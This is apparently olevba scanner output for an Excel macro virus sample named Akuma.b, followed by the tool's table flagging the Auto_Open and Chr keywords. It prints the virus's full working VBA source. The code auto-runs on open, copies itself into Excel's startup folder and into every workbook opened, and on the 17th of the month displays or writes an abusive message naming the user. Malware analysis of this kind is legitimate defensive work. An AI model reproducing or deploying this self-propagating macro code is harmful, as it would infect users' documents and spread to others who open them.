olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Akuma.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Akuma.bas 
in file: Virus.MSExcel.Akuma.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Akuma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Auto_Open()
    With Application
        .DisplayRecentFiles = True
        .SheetsInNewWorkbook = 128
    End With
    Application.OnSheetActivate = "Akuma.Akuma"
End Sub

Private Sub Akuma()
    e = False
    m = False
    If Dir(Application.StartupPath & "\" & "Akuma.XLS") = "Akuma.XLS" Then e = True
    For c = 1 To ActiveWorkbook.Sheets.Count
        If ActiveWorkbook.Sheets(c).Name = "Akuma" Then m = True: Exit For
    Next c
    If e = False Then AkumaExcel
    If m = False Then AkumaModule
    Application.OnSheetActivate = "Akuma.xls!Akuma.Akuma"
    If Day(Date) = 17 Then AkumaDestroy
End Sub

Private Sub AkumaExcel()
    On Error GoTo OutExcel
    Application.ScreenUpdating = False
    actn$ = ActiveWorkbook.Name
    Workbooks(actn$).Sheets("Akuma").Copy
    nn$ = ActiveWorkbook.Name
    cdir$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(nn$).SaveAs FileName:=Application.StartupPath & "/" & "Akuma.XLS", FileFormat:=xlNormal, Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
    ChDir cdir$
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Akuma.xls!Akuma.Akuma"
OutExcel:
    On Error GoTo 0
End Sub

Private Sub AkumaModule()
    On Error GoTo OutModule
    Application.ScreenUpdating = False
    actn$ = ActiveWorkbook.Name
    Workbooks("Akuma.xls").Sheets("Akuma").Copy before:=Workbooks(actn$).Sheets(1)
    Workbooks(actn$).Save
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Akuma.xls!Akuma.Akuma"
OutModule:
    On Error GoTo 0
End Sub

Private Sub AkumaDestroy()
    If Dir("c:\mary.log", vbArchive + vbHidden + vbReadOnly) = "" Then
        For c = 1 To ActiveWorkbook.Sheets.Count
            If ActiveWorkbook.Sheets(c).Name <> "Akuma" Then copier = c: Exit For
        Next c
        ActiveWorkbook.Sheets(copier).Select
        ActiveWorkbook.Sheets(copier).Visible = True
        Cells(1, 1) = "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus."
        Cells(2, 1) = "Minny is simply a bitch and you, " + Application.UserName + ", are a stupid jerk."
        Cells(3, 1) = "Have a nice day."
        ActiveWorkbook.Sheets(copier).Visible = False
    Else
        MsgBox "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Minny is simply a bitch and you, " + Application.UserName + ", are a stupid jerk." + Chr$(10) + "Have a nice day."
    End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

